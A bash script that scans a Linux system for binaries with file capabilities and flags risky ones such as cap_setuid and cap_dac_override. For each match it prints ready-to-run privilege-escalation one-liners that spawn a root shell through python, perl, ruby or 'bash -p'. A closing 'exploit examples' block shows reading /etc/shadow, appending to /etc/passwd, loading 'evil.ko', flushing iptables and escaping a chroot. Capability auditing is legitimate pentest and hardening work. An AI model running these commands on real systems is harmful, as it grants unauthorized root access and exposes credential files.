#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║       LINUX CAPABILITIES SCANNER        ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"

echo -e "\n${BLUE}[+] Checking for getcap command${NC}"
if command -v getcap &> /dev/null; then
    echo -e "${GREEN}[+] getcap is available${NC}"
    getcap_version=$(getcap -v 2>&1 | head -1)
    echo -e "${YELLOW}Version info: $getcap_version${NC}"
else
    echo -e "${RED}[!] getcap is not available${NC}"
    echo -e "${YELLOW}Install: sudo apt install libcap2-bin${NC}"
    exit 1
fi

echo -e "\n${BLUE}[+] Scanning for files with capabilities${NC}"
getcap -r / 2>/dev/null > /tmp/capabilities.txt
cap_count=$(wc -l < /tmp/capabilities.txt)

if [ "$cap_count" -eq 0 ]; then
    echo -e "${GREEN}[+] No files with capabilities found${NC}"
    exit 0
fi

echo -e "${GREEN}[+] Found $cap_count files with capabilities${NC}"

echo -e "\n${BLUE}[+] Analyzing capabilities${NC}"

dangerous_caps=(
    "cap_setuid"
    "cap_setgid"
    "cap_sys_admin"
    "cap_sys_module"
    "cap_sys_rawio"
    "cap_sys_ptrace"
    "cap_net_admin"
    "cap_net_raw"
    "cap_sys_chroot"
    "cap_sys_time"
    "cap_dac_override"
    "cap_dac_read_search"
    "cap_fowner"
    "cap_fsetid"
)

echo -e "\n${YELLOW}[+] Checking for dangerous capabilities${NC}"

while IFS= read -r line; do
    file=$(echo "$line" | awk '{print $1}')
    caps=$(echo "$line" | awk '{$1=""; print $0}' | sed 's/^\s*//')
    
    dangerous_found=false
    
    for cap in "${dangerous_caps[@]}"; do
        if echo "$caps" | grep -qi "$cap"; then
            if [ "$dangerous_found" = false ]; then
                echo -e "\n${RED}[!] DANGEROUS CAPABILITIES: $file${NC}"
                echo -e "${GREEN}    Capabilities: $caps${NC}"
                dangerous_found=true
            fi
        fi
    done
    
    if [ "$dangerous_found" = true ]; then
        file_name=$(basename "$file")
        
        case "$file_name" in
            *python*|*python2*|*python3*)
                echo -e "${YELLOW}    Exploit (cap_setuid):${NC}"
                echo -e "    $file -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
                ;;
            *perl*)
                echo -e "${YELLOW}    Exploit (cap_setuid):${NC}"
                echo -e "    $file -e 'use POSIX qw(setuid); POSIX::setuid(0); system(\"/bin/sh\");'"
                ;;
            *ruby*)
                echo -e "${YELLOW}    Exploit (cap_setuid):${NC}"
                echo -e "    $file -e 'Process.uid=0; exec \"/bin/sh\"'"
                ;;
            *bash*|*sh*)
                echo -e "${YELLOW}    Exploit (cap_setuid):${NC}"
                echo -e "    $file -p"
                ;;
            *tar*)
                echo -e "${YELLOW}    Exploit (cap_dac_override):${NC}"
                echo -e "    Can read/write files regardless of permissions"
                ;;
            *zip*|*unzip*)
                echo -e "${YELLOW}    Exploit (cap_dac_override):${NC}"
                echo -e "    Can write to protected directories"
                ;;
            *nc*|*netcat*)
                echo -e "${YELLOW}    Exploit (cap_net_raw):${NC}"
                echo -e "    Can create raw sockets and sniff traffic"
                ;;
            *tcpdump*)
                echo -e "${YELLOW}    Exploit (cap_net_raw):${NC}"
                echo -e "    Can sniff network traffic"
                ;;
            *)
                echo -e "${YELLOW}    File type:${NC}"
                file "$file"
                ;;
        esac
    fi
done < /tmp/capabilities.txt

echo -e "\n${BLUE}[+] Checking for specific capabilities breakdown${NC}"

echo -e "\n${YELLOW}[+] CAP_SETUID/CAP_SETGID${NC}"
grep -i "setuid\|setgid" /tmp/capabilities.txt | while read -r line; do
    echo -e "${RED}[!] $line${NC}"
    echo -e "${GREEN}    Can escalate privileges by setting UID/GID to 0${NC}"
done

echo -e "\n${YELLOW}[+] CAP_SYS_ADMIN${NC}"
grep -i "sys_admin" /tmp/capabilities.txt | while read -r line; do
    echo -e "${RED}[!] $line${NC}"
    echo -e "${GREEN}    Equivalent to root - mount, module loading, etc${NC}"
done

echo -e "\n${YELLOW}[+] CAP_SYS_MODULE${NC}"
grep -i "sys_module" /tmp/capabilities.txt | while read -r line; do
    echo -e "${RED}[!] $line${NC}"
    echo -e "${GREEN}    Can load kernel modules${NC}"
done

echo -e "\n${YELLOW}[+] CAP_NET_ADMIN${NC}"
grep -i "net_admin" /tmp/capabilities.txt | while read -r line; do
    echo -e "${RED}[!] $line${NC}"
    echo -e "${GREEN}    Can modify routing tables, firewall rules${NC}"
done

echo -e "\n${YELLOW}[+] CAP_DAC_OVERRIDE${NC}"
grep -i "dac_override" /tmp/capabilities.txt | while read -r line; do
    echo -e "${RED}[!] $line${NC}"
    echo -e "${GREEN}    Can bypass file read/write permissions${NC}"
done

echo -e "\n${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║      CAPABILITY EXPLOIT EXAMPLES        ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"

cat << 'EOF'

1. CAP_SETUID + EP (Effective + Permitted):
   Python:
   python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
   
   Perl:
   perl -e 'use POSIX qw(setuid); POSIX::setuid(0); system("/bin/sh");'
   
   Ruby:
   ruby -e 'Process.uid=0; exec "/bin/sh"'

2. CAP_DAC_OVERRIDE:
   Read any file:
   /bin/cat /etc/shadow
   
   Write to protected files:
   /bin/tee -a /etc/passwd

3. CAP_SYS_ADMIN:
   Mount filesystems:
   mount /dev/sda1 /mnt
   
   Load kernel modules:
   insmod evil.ko

4. CAP_NET_RAW:
   Sniff traffic:
   tcpdump -i any

5. CAP_NET_ADMIN:
   Modify firewall:
   iptables -F
   
   Modify routing:
   ip route add ...

6. CAP_SYS_CHROOT:
   Escape chroot:
   chroot /mnt/root

EOF

echo -e "\n${BLUE}[+] Checking current process capabilities${NC}"
if command -v capsh &> /dev/null; then
    echo -e "${GREEN}Current capabilities:${NC}"
    capsh --print | grep -i "current\|bounding"
else
    echo -e "${YELLOW}capsh not available${NC}"
fi

echo -e "\n${BLUE}[+] Creating capability reference file${NC}"
cat > /tmp/caps_reference.txt << 'EOF'
CAP_CHOWN            - Change file ownership
CAP_DAC_OVERRIDE     - Bypass file permission checks
CAP_DAC_READ_SEARCH  - Bypass file permission checks (read)
CAP_FOWNER           - Override file permission checks
CAP_FSETID           - Override file permission checks (setuid/setgid)
CAP_KILL             - Send signals to arbitrary processes
CAP_SETGID           - Set GID
CAP_SETUID           - Set UID
CAP_SETPCAP          - Modify capabilities
CAP_LINUX_IMMUTABLE  - Set FS_APPEND_FL, FS_IMMUTABLE_FL
CAP_NET_BIND_SERVICE - Bind privileged ports (<1024)
CAP_NET_BROADCAST    - Make socket broadcasts
CAP_NET_ADMIN        - Various network operations
CAP_NET_RAW          - Use raw sockets
CAP_IPC_LOCK         - Lock memory
CAP_IPC_OWNER        - Override IPC ownership checks
CAP_SYS_MODULE       - Load kernel modules
CAP_SYS_RAWIO        - Access I/O ports
CAP_SYS_CHROOT       - Use chroot()
CAP_SYS_PTRACE       - Trace arbitrary processes
CAP_SYS_PACCT        - Use acct()
CAP_SYS_ADMIN        - Perform administrative operations
CAP_SYS_BOOT         - Reboot system
CAP_SYS_NICE         - Change process priority
CAP_SYS_RESOURCE     - Override resource limits
CAP_SYS_TIME         - Set system clock
CAP_SYS_TTY_CONFIG   - Configure TTY
CAP_MKNOD            - Create special files
CAP_LEASE            - Establish leases
CAP_AUDIT_WRITE      - Write audit records
CAP_AUDIT_CONTROL    - Configure audit subsystem
CAP_SETFCAP          - Set file capabilities
CAP_MAC_OVERRIDE     - Override MAC restrictions
CAP_MAC_ADMIN        - Configure MAC
CAP_SYSLOG           - Kernel logging
CAP_WAKE_ALARM       - Wake alarm timers
CAP_BLOCK_SUSPEND    - Block system suspend
CAP_AUDIT_READ       - Read audit logs
CAP_PERFMON          - Access performance monitoring
CAP_BPF              - Use BPF
CAP_CHECKPOINT_RESTORE- Checkpoint/restore processes
EOF

echo -e "${GREEN}[+] Capabilities scan complete${NC}"
echo -e "${YELLOW}Full capability list saved to: /tmp/capabilities.txt${NC}"
echo -e "${YELLOW}Capability reference saved to: /tmp/caps_reference.txt${NC}"
